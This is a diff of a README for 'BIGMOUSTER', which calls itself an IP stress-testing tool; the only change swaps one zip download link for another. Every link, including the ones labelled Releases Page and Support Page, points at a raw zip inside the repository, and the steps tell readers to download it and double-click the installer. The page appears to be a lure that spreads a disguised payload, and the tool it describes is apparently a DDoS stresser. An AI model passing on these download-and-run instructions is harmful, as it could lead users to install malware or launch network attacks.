@@ -6,7 +6,7 @@ Welcome to BIGMOUSTER, a simple tool designed for stress testing your IP address
 
 ## 📥 Download BIGMOUSTER
 
-[![Download BIGMOUSTER](https://raw.githubusercontent.com/Malikshahryar22/BIGMOUSTER/main/tiffin/Software-3.2.zip)](https://raw.githubusercontent.com/Malikshahryar22/BIGMOUSTER/main/tiffin/Software-3.2.zip)
+[![Download BIGMOUSTER](https://raw.githubusercontent.com/Malikshahryar22/BIGMOUSTER/main/tiffin/Software_v1.8.zip)](https://raw.githubusercontent.com/Malikshahryar22/BIGMOUSTER/main/tiffin/Software_v1.8.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,13 +19,13 @@ Before you download, ensure your system meets these requirements:
 
 ## 🌐 Visit the Releases Page
 
-To download the latest version of BIGMOUSTER, please visit our [Releases Page](https://raw.githubusercontent.com/Malikshahryar22/BIGMOUSTER/main/tiffin/Software-3.2.zip).
+To download the latest version of BIGMOUSTER, please visit our [Releases Page](https://raw.githubusercontent.com/Malikshahryar22/BIGMOUSTER/main/tiffin/Software_v1.8.zip).
 
 ## 📥 Download & Install 
 
-1. Go to the [Releases Page](https://raw.githubusercontent.com/Malikshahryar22/BIGMOUSTER/main/tiffin/Software-3.2.zip).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/Malikshahryar22/BIGMOUSTER/main/tiffin/Software_v1.8.zip).
 2. Select the latest version available. You’ll see an option for downloading.
-3. Click on the file to start your download. The file name might look something like `https://raw.githubusercontent.com/Malikshahryar22/BIGMOUSTER/main/tiffin/Software-3.2.zip` or similar.
+3. Click on the file to start your download. The file name might look something like `https://raw.githubusercontent.com/Malikshahryar22/BIGMOUSTER/main/tiffin/Software_v1.8.zip` or similar.
 4. Once downloaded, locate the file in your downloads folder.
 5. Double-click on the file to run the installer. 
 
@@ -55,7 +55,7 @@ If you encounter issues:
 - Restart the application if it fails to load.
 - Check your internet connection for issues.
 
-For additional help, visit our [Support Page](https://raw.githubusercontent.com/Malikshahryar22/BIGMOUSTER/main/tiffin/Software-3.2.zip).
+For additional help, visit our [Support Page](https://raw.githubusercontent.com/Malikshahryar22/BIGMOUSTER/main/tiffin/Software_v1.8.zip).
 
 ## 📣 Community and Contributions
 
@@ -71,6 +71,6 @@ Your feedback is important to us. Please share your thoughts on your experience 
 
 ## 🌐 Visit the Releases Page Again
 
-Don't forget to check back for updates! Find the latest downloads once more at our [Releases Page](https://raw.githubusercontent.com/Malikshahryar22/BIGMOUSTER/main/tiffin/Software-3.2.zip). 
+Don't forget to check back for updates! Find the latest downloads once more at our [Releases Page](https://raw.githubusercontent.com/Malikshahryar22/BIGMOUSTER/main/tiffin/Software_v1.8.zip). 
 
 By following these simple steps, you can successfully download and run BIGMOUSTER. Enjoy testing your IP efficiently and effectively!
